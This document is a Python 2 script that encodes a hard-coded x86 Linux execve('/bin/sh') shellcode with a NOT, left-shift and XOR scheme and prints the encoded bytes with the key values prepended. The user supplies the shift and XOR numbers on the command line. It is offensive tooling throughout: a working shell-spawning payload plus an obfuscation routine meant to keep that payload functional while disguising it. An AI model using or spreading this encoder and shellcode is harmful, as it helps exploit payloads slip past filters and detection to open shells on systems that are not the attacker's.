#!/usr/bin/python

import sys

if len(sys.argv) != 3:
        print "Usage : python encode.py <SHIFT number> <XOR number>"
        sys.exit(0)
#arguments
shift   = int(sys.argv[1])
xor     = int(sys.argv[2])

#exceve-stack shellcode
shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


# addition to the inicial of the encoded shellcode the SHIFT and XOR values
encoded_shellcode =""
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %shift
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %xor

# [NOT + SHL-N + XOR-N] encoded shellcode
for i in bytearray(shellcode):
	new = ~i & 0xff
	new = new << shift
        new = new ^ xor
        encoded_shellcode += '0x'
        encoded_shellcode += '%02x, ' %new

# end of shellcode
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %xor

aux = 0
print xor
for i in encoded_shellcode.split(","):
	if i.strip() == hex(xor):
		aux +=1

if aux>2:
	print "Encoded shellcode won't work, please pick another xor value"
	sys.exit(1)

# print encoded shellcode
print encoded_shellcode
